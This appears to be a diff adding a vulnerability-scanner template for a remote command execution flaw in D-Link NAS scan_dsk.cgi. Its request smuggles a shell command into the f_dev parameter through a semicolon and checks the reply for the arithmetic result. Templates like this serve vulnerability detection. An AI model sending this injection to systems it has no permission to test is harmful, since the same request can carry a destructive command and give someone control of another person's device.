@@ -1,0 +1,30 @@
+id: d-link-nas-scandsk-cgi-rce
+info:
+  name: D-Link NAS scan_dsk.cgi Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    D-Link NAS scan_dsk.cgi is vulnerable to remote command execution via crafted input.
+variables:
+  t1: "{{rand_int(111000,999000)}}"
+  t2: "{{rand_int(10,100)}}"
+  t3: "{{to_number(t1) - to_number(t2)}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/scan_dsk.cgi?cmd=ScanDisk_run_e2fsck&f_dev=x;expr%20{{t1}}%20-%20{{t2}};"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "location.href"
+          - "{{t3}}"
+      - type: word
+        part: header
+        words:
+          - "lighttpd"
